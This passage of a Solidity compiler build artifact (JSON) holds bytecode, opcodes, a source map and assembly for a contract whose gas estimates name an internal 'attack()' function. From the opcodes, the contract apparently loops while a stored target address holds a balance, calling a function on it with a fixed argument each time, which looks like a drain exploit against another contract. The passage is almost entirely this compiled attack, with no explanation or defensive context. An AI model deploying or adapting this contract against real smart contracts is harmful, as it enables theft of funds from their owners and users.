							"object": "608060405261000c61000e565b005b5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061016d5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001546040516024016100999190610188565b6040516020818303038152906040527f8ba14562000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610123919061021d565b6000604051808303816000865af19150503d8060008114610160576040519150601f19603f3d011682016040523d82523d6000602084013e610165565b606091505b50505061000f565b565b6000819050919050565b6101828161016f565b82525050565b600060208201905061019d6000830184610179565b92915050565b600081519050919050565b600081905092915050565b60005b838110156101d75780820151818401526020810190506101bc565b838111156101e6576000848401525b50505050565b60006101f7826101a3565b61020181856101ae565b93506102118185602086016101b9565b80840191505092915050565b600061022982846101ec565b91508190509291505056fea264697066735822122008832061b007063726229aea01da18f2a78ad390f033441ca3727eeac422febd64736f6c634300080f0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH2 0xC PUSH2 0xE JUMP JUMPDEST STOP JUMPDEST JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x16D JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x188 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x8BA1456200000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x123 SWAP2 SWAP1 PUSH2 0x21D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x160 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x165 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH2 0xF JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x182 DUP2 PUSH2 0x16F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x179 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1D7 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x1BC JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x1E6 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F7 DUP3 PUSH2 0x1A3 JUMP JUMPDEST PUSH2 0x201 DUP2 DUP6 PUSH2 0x1AE JUMP JUMPDEST SWAP4 POP PUSH2 0x211 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x1B9 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x229 DUP3 DUP5 PUSH2 0x1EC JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 ADDMOD DUP4 KECCAK256 PUSH2 0xB007 MOD CALLDATACOPY 0x26 0x22 SWAP11 0xEA ADD 0xDA XOR CALLCODE 0xA7 DUP11 0xD3 SWAP1 CREATE CALLER DIFFICULTY SHR LOG3 PUSH19 0x7EEAC422FEBD64736F6C634300080F00330000 ",
							"sourceMap": "60:492:0:-:0;;;533:8;:6;:8::i;:::-;60:492;294:192;332:147;373:1;338:23;;;;;;;;;;;:31;;;:36;332:147;;386:23;;;;;;;;;;:28;;457:8;;415:51;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;386:81;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;332:147;;;294:192::o;7:77:1:-;44:7;73:5;62:16;;7:77;;;:::o;90:118::-;177:24;195:5;177:24;:::i;:::-;172:3;165:37;90:118;;:::o;214:222::-;307:4;345:2;334:9;330:18;322:26;;358:71;426:1;415:9;411:17;402:6;358:71;:::i;:::-;214:222;;;;:::o;442:98::-;493:6;527:5;521:12;511:22;;442:98;;;:::o;546:147::-;647:11;684:3;669:18;;546:147;;;;:::o;699:307::-;767:1;777:113;791:6;788:1;785:13;777:113;;;876:1;871:3;867:11;861:18;857:1;852:3;848:11;841:39;813:2;810:1;806:10;801:15;;777:113;;;908:6;905:1;902:13;899:101;;;988:1;979:6;974:3;970:16;963:27;899:101;748:258;699:307;;;:::o;1012:373::-;1116:3;1144:38;1176:5;1144:38;:::i;:::-;1198:88;1279:6;1274:3;1198:88;:::i;:::-;1191:95;;1295:52;1340:6;1335:3;1328:4;1321:5;1317:16;1295:52;:::i;:::-;1372:6;1367:3;1363:16;1356:23;;1120:265;1012:373;;;;:::o;1391:271::-;1521:3;1543:93;1632:3;1623:6;1543:93;:::i;:::-;1536:100;;1653:3;1646:10;;1391:271;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "123600",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"": "infinite"
							},
							"internal": {
								"attack()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 552,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 552,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 552,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 149,
									"end": 157,
									"name": "PUSH",
									"source": 0,
									"value": "C68000"
								},
								{
									"begin": 133,
									"end": 157,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 133,
									"end": 157,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 166,
									"end": 286,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 166,
									"end": 286,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 166,
									"end": 286,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 166,
									"end": 286,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 166,
									"end": 286,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 256,
									"end": 278,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 230,
									"end": 253,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 230,
									"end": 253,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 230,
									"end": 278,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 230,
									"end": 278,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 230,
									"end": 278,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 230,
									"end": 278,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 166,
									"end": 286,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 60,
									"end": 552,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 60,
									"end": 552,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "19"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 1,
									"value": "19"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "24"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 1,
									"value": "24"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 915,
									"end": 921,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 964,
									"end": 966,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 952,
									"end": 961,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 943,
									"end": 950,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 939,
									"end": 962,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 935,
									"end": 967,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "26"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 970,
									"end": 1049,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "tag",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "tag",
									"source": 1,
									"value": "26"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1090,
									"end": 1091,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 1171,
									"end": 1178,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 1162,
									"end": 1168,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1151,
									"end": 1160,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1147,
									"end": 1169,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 1115,
									"end": 1179,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "tag",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1061,
									"end": 1189,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 60,
									"end": 552,
									"name": "tag",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 60,
									"end": 552,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 60,
									"end": 552,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 552,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 60,
									"end": 552,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 552,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 552,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 60,
									"end": 552,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 552,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122008832061b007063726229aea01da18f2a78ad390f033441ca3727eeac422febd64736f6c634300080f0033",
									".code": [
										{
											"begin": 60,
											"end": 552,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 60,
											"end": 552,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 60,
											"end": 552,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 533,
											"end": 541,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 533,
											"end": 539,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 533,
											"end": 541,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 533,
											"end": 541,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 533,
											"end": 541,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 552,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 294,
											"end": 486,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 294,
											"end": 486,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 332,
											"end": 479,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 332,
											"end": 479,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 373,
											"end": 374,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 338,
											"end": 361,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 361,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 338,
											"end": 361,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 361,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 338,
											"end": 361,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 361,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 338,
											"end": 361,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 361,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 361,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 338,
											"end": 361,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 338,
											"end": 361,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 338,
											"end": 369,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 338,
											"end": 369,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 338,
											"end": 369,
											"name": "BALANCE",
											"source": 0
										},
										{
											"begin": 338,
											"end": 374,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 332,
											"end": 479,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 332,
											"end": 479,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 386,
											"end": 409,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 409,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 409,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 386,
											"end": 409,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 409,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 386,
											"end": 409,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 409,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 409,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 386,
											"end": 409,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 386,
											"end": 409,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 386,
											"end": 414,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 386,
											"end": 414,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 457,
											"end": 465,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 457,
											"end": 465,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 415,
											"end": 466,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH",
											"source": 0,
											"value": "8BA1456200000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH",
											"source": 0,
